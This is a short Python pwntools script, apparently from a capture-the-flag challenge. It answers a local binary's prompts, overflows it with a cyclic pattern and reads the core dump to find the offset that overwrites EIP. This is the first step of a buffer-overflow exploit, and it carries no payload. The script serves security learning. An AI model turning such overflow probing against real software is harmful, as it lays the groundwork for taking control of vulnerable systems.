#!/usr/bin/python

from pwn import *

# setup for the binary
target = process('./pwn1')

# get shit, send shit
#print target.recvline()
#print target.recvline()
target.sendline('Sir Lancelot of Camelot')
#print target.recvline()
target.sendline('To seek the Holy Grail.')
print target.recvline()
target.sendline(cyclic(128))

# wait for the crash
target.wait()

core = target.corefile
print cyclic_find(core.eip)
